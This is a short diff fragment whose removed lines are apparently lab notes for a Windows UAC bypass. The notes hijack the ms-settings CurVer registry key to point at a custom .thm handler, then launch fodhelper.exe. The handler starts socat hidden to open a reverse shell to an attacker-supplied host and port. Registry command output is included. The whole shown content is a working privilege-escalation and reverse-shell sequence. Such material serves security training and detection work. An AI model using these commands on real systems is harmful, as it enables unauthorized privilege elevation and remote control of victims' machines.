@@ -1,9 +1,0 @@
-set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:{lhost}:{lport} EXEC:cmd.exe,pipes"
-
-reg add "HKCU\Software\Classes\.thm\Shell\Open\command" /d %CMD% /f
-The operation completed successfully.
-
-reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".thm" /f
-The operation completed successfully.
-
-fodhelper.exe
